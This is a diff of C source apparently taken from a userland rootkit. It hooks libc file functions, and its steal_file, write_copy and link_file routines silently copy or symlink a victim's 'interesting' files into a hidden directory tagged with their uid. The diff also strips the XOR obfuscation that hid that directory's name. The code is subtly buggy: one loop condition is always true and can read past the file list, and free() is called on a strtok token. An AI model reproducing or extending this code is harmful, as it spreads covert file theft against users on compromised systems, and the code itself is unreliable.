@@ -1,9 +1,11 @@
 int interesting(const char *path){
     int v = 0;
 
-    for(int i = 0; interesting_files[i] != NULL; i++){
-        if(!xstrncmp(interesting_files[i], path)) v = 1;
-        if(v) break;
+    for(int i = 0; INTERESTING_FILES_SIZE; i++){
+        if(!strncmp(interesting_files[i], path, strlen(interesting_files[i]))){
+            v = 1;
+            break;
+        }
     }
 
     return v;
@@ -13,14 +15,16 @@ char *get_filename(const char *path){
     char *pdup = strdup(path),
          *tok,
          *ret = (char *)malloc(512);
+
     if(strstr(pdup, "/")){
         tok = strtok(pdup, "/");
         while(tok != NULL){     /* this will break once we reach the filename */
-            (void)strncpy(ret, tok, 512);
+            strncpy(ret, tok, 512);
             tok = strtok(NULL, "/");
         }
         free(tok);
-    }else (void)strncpy(ret, pdup, 512);
+    }else strncpy(ret, pdup, 512);
+
     free(pdup);
     return ret;
 }
@@ -33,17 +37,17 @@ int write_copy(const char *old_path, char *new_path){
 
     if((ofp = call(CFOPEN, old_path, "r")) == NULL) return -1;
     if((nfp = call(CFOPEN, new_path, "w")) == NULL){
-        (void)fclose(ofp);
+        fclose(ofp);
         return -1;
     }
 
     while(fgets(buf, sizeof(buf), ofp) != NULL){
         if(strlen(buf) == 0) break;
-        (void)call(CFWRITE, buf, strlen(buf), 1, nfp);
+        call(CFWRITE, buf, strlen(buf), 1, nfp);
     }
 
-    (void)fclose(ofp);
-    (void)fclose(nfp);
+    fclose(ofp);
+    fclose(nfp);
     return 1;
 }
 
@@ -53,12 +57,10 @@ char *get_new_path(char *filename){
 
     if(_filename[0] == '.') memmove(_filename, _filename + 1, strlen(_filename));
 
-    xor(interest_dir, INTEREST_DIR);
-    (void)snprintf(ret, PATH_MAX + 4, "%s/%s-%d",
-                                      interest_dir,
-                                      _filename,
-                                      getuid());
-    clean(interest_dir);
+    snprintf(ret, PATH_MAX + 4, "%s/%s-%d",
+                                INTEREST_DIR,
+                                _filename,
+                                getuid());
 
     free(_filename);
     return ret;
@@ -85,7 +87,7 @@ int steal_file(const char *old_path, char *filename, char *new_path){
 
 #ifdef LINK_IF_ERR
 int link_file(const char *old_path, char *new_path){
-    (void)strncat(new_path, "-link", strlen("-link") + 1);
+    strncat(new_path, "-link", strlen("-link") + 1);
     hook(CSYMLINK);
     return (long)call(CSYMLINK, old_path, new_path);
 }
